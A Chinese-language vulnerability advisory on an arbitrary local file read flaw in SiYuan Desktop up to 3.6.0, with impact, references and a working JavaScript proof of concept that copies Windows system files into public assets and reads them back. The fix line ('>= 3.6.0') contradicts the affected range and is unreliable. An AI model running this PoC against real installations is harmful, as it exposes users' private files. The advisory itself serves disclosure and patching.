#  【高危漏洞预警】SiYuan（思源笔记）桌面发布服务存在任意文件读取漏洞  
 信通云服   2026-03-23 08:59  
  
【漏洞描述】  
  
组件介绍  
  
SiYuan（思源笔记）是一款开源、本地优先的个人知识管理软件，核心特点是数据完全由用户掌控（默认存本地）、支持双链与块级引用（可精细到段落进行网状关联），并采用所见即所得的Markdown编辑体验。它适合注重隐私、希望长期自主管理知识库的用户，并可通过插件、挂件或自建同步服务进行扩展。  
  
漏洞简介  
  
在SiYuan Desktop 版本 ≤ 3.6.0中存在一个安全漏洞，该漏洞本质是由于思源笔记的 /api/lute/html2BlockDOM 接口在解析用户提交的 HTML 时，未对 <img src="file://..."> 这种本地文件路径做安全限制，导致服务器会将任意本地文件读取并复制到可公开访问的 assets 目录中，攻击者随后即可通过 /assets/ 路径直接访问这些文件，从而实现任意文件读取并造成敏感信息泄露。  
# 【漏洞复现】  
  
下载  
版本 ≤ 3.6.0的桌面版本，将其安装并启动即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tOrb0WDic7ichPVy8Lcj5NWCa48p8WY5HmiaOSrLY4ab7JOd6iccaMx4MKevjznlBCQiaTRvSdkJbiaicMd0AOQncVZguHbuCEiaMgMoD04PCKckyY8/640?wx_fmt=png&from=appmsg "")  
  
启动后访问http://127.0.0.1:6806，随后在console中输入poc  
```
(async () => {
  try {
    const sensitiveFiles = [
      'file:///C:/Windows/System32/drivers/etc/hosts',
      'file:///C:/Windows/win.ini',
    ];
    const dom = '<p>' + sensitiveFiles.map(f => `<a href="${f}">x</a>`).join(' ') + '</p>';
    const r1 = await fetch('/api/lute/html2BlockDOM', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ dom }),
      credentials: 'same-origin',
    });
    const { data } = await r1.json();
    const paths = [...(data || '').matchAll(/data-href="(assets\/[^"]+)"/g)].map(m => m[1]);
    for (const p of paths) {
      const r2 = await fetch('/' + p, { credentials: 'same-origin' });
      if (r2.ok) console.log('--- ' + p + ' ---\n' + (await r2.text()));
    }
  } catch (_) {}
})();
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tOrb0WDic7iciaY0Kz6NbTUGWMexyiaMhZxdfWYlofYypesXnY1xmom7p9aCc4qcjQSLQDBuaQODtNuBq93JX7PezumdoDQ14buOPzQYicfsF9jQ/640?wx_fmt=png&from=appmsg "")  
# 【影响范围】  
  
SiYuan Desktop  <= 3.6.0  
# 【修复建议】  
  
补丁版本 >=  
 3.6.0  
# 【参考链接】  
  
https://githu  
b.com/siyuan-note/siyuan/commit/294b8b429dea152cd1df522cddf406054c1619ad  
  
https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1  
  
https://github.com/siyuan-note/siyuan/security/advisories/GHSA-fq2j-j8hc-8vw8  
  
  
